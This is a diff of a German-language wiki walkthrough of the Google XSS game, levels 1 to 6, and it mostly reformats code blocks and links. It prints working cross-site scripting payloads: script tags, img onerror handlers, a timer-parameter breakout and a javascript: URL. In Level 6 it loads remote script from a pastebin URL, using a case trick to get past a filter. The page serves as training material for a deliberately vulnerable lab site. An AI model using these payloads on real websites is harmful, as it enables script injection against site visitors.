@@ -7,9 +7,9 @@ Bei XSS geht es darum "evil code" in eine Webseite einzuschleusen um dadurch dan
 
 ### Level 1
 Im ersten Level hat man ein Eingabefeld zur Verfügung. Da die Daten, welche in diesem Feld sind, nicht escaped werden, kann man nur 
-
-
-```<script>alert(1)</script>```
+```
+<script>alert(1)</script>
+```
 eingeben und man erreicht das Ziel.
 
 
@@ -17,8 +17,10 @@ eingeben und man erreicht das Ziel.
 ----
 
 ### Level 2
-Im zweiten Level hat man ebenfalls ein Eingabefeld. Diesmal kann man eine Ausführung von [JavaScript](/wiki/programmiersprachen/javascript) nicht einfach nur durch eingabe des "<script>"-Tags erzielen. Man gibt folgendes ein:
-```<img src="x" onerror="alert(1)">```
+Im zweiten Level hat man ebenfalls ein Eingabefeld. Diesmal kann man eine Ausführung von [JavaScript](/de/wiki/programmiersprachen/javascript) nicht einfach nur durch eingabe des "<script>"-Tags erzielen. Man gibt folgendes ein:
+```
+<img src="x" onerror="alert(1)">
+```
 Da man jetzt ein Bild lädt, welches nicht existiert, wird das Script im "onerror" ausgeführt.
 
 
@@ -27,7 +29,9 @@ Da man jetzt ein Bild lädt, welches nicht existiert, wird das Script im "onerro
 
 ### Level 3
 In diesem Level muss man Code über die [HTTP-GET](https://de.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP-Anfragemethoden) Methode einschleusen. Diesmal muss man direkt nach dem "#" ein " ' " (Hochkomma) platzieren, damit im Webseiten-Code die parseInt() funktion nicht mehr greift. Danach fügt man ebenfalls wieder ein Bild ein, welches auf "onerror" ein Script ausführt.
-``` https://xss-game.appspot.com/level3/frame#');<img src="x" onerror="alert(1)"> ```
+```
+https://xss-game.appspot.com/level3/frame#');<img src="x" onerror="alert(1)">
+```
 
 
 
@@ -35,8 +39,12 @@ In diesem Level muss man Code über die [HTTP-GET](https://de.wikipedia.org/wiki
 
 ### Level 4
 Im vierten Level geht es darum einen JavaScript Timer zu manipulieren. Dieser nimmt die Zeit, welche er warten muss, ebenfalls über die [HTTP-GET](https://de.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP-Anfragemethoden) Methode. Diesmal übergibt dem Eingabefeld ein " ' " (Hochkomma). Jetzt wird der Timer unendlich lange zählen (er wird nicht ausgeführt). Der ausgeführte Code sieht dann wie folgt aus:
-```startTimer(''')``` In diesem Zustand kann man dann den "timer=" Parameter Manipulieren. Diesmal kann man jedoch nicht einfach eine ")" ("timer=')") danach einfügen, weil der ausgeführte Code dann folgendermassen aussehen würde:
-```startTimer('')')```
+```
+startTimer(''')
+``` In diesem Zustand kann man dann den "timer=" Parameter Manipulieren. Diesmal kann man jedoch nicht einfach eine ")" ("timer=')") danach einfügen, weil der ausgeführte Code dann folgendermassen aussehen würde:
+```
+startTimer('')')
+```
 Jetzt weiss man, dass man so den Code unterbrechen kann. Da man aber nicht "';" schreiben kann ```startTimer('';')``` 
 muss man das ";" codieren. Mit %3B erreicht man das.
 
@@ -76,7 +84,7 @@ https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
 ----
 
 ### Level 6
-Dieses Level ist das schwierigste von allen. Man muss über den GET-Parameter schadhaften Code von einem [Hosting](http://pastebin.com/raw/rTRPYeNk) einfügen. Da das JavaScript jedoch nur "https:" nicht zulässt (CaseSensitive) kann man den Parameter der [URL](/wiki/url) folgendermassen manipulieren ("htTps"):
+Dieses Level ist das schwierigste von allen. Man muss über den GET-Parameter schadhaften Code von einem [Hosting](http://pastebin.com/raw/rTRPYeNk) einfügen. Da das JavaScript jedoch nur "https:" nicht zulässt (CaseSensitive) kann man den Parameter der [URL](/de/wiki/url) folgendermassen manipulieren ("htTps"):
 ```
 https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0
 ```
